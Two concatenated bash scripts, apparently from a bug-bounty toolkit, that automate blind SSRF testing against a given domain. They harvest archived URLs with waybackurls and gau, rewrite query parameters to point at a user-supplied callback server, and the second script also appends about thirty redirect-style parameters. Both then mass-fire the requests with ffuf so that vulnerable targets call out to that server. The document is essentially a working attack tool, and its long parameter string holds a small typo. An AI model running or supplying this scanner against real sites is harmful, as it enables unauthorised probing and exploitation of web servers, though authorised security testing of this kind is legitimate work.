#!/bin/bash

DOMAIN=$1
WORKSPACE=$HACKING_RESULT/$DOMAIN/ssrf
CALLBACK="$2/ssrf/###"

if [ ! -d "$WORKSPACE" ]; then
	echo "[*] Making directory for domain"
	mkdir -p "$WORKSPACE"
fi

echo "[*] Getting WaybackURLs"
waybackurls $DOMAIN > $WORKSPACE/urls.txt

echo "[*] Getting URLs with GAU"
gau $DOMAIN >> $WORKSPACE/urls.txt

cat $WORKSPACE/urls.txt | sort | uniq | grep "?" | qsreplace $CALLBACK | awk '{gsub("%23%23%23",NR,$0);print}' > $WORKSPACE/urls_final.txt

ffuf -w $WORKSPACE/urls_final.txt -u FUZZ









#!/bin/bash

echo "Blind SSRF testing - append to parameters and add new parameters @hussein98d"
echo "Usage: bash script.sh domain.com http://server-callbak"
echo "This script uses https://github.com/ffuf/ffuf, https://github.com/lc/gau, https://github.com/tomnomnom/waybackurls"
if [ -z "$1" ]; then
	  echo >&2 "ERROR: Domain not set"
		  exit 2
fi
if [ -z "$2" ]; then
	  echo >&2 "ERROR: Sever link not set"
		  exit 2
fi
echo "Getting WaybackURLS"
waybackurls $1 > $1-ssrf.txt
echo "Getting URLS with GAU"
gau $1 >> $1-ssrf.txt
echo "Putting them all together.."
cat $1-ssrf.txt | sort | uniq | grep "?" | qsreplace -a | qsreplace $2 > $1-ssrf2.txt
sed -i "s|$|\&dest=$2\&redirect=$2\&uri=$2\&path=$2\&continue=$2\&url=$2\&window=$2\&next=$2\&data=$2\&reference=$2\&site=$2\&html=$2\&val=$2\&validate=$2\&domain=$2\&callback=$2\&return=$2\&page=$2\&feed=$2\&host=$2&\port=$2\&to=$2\&out=$2\&view=$2\&dir=$2\&show=$2\&navigation=$2\&open=$2|g" $1-ssrf2.txt
echo "Firing the requests - check your server for potential callbacks"
ffuf -w $1-ssrf2.txt -u FUZZ -t 50
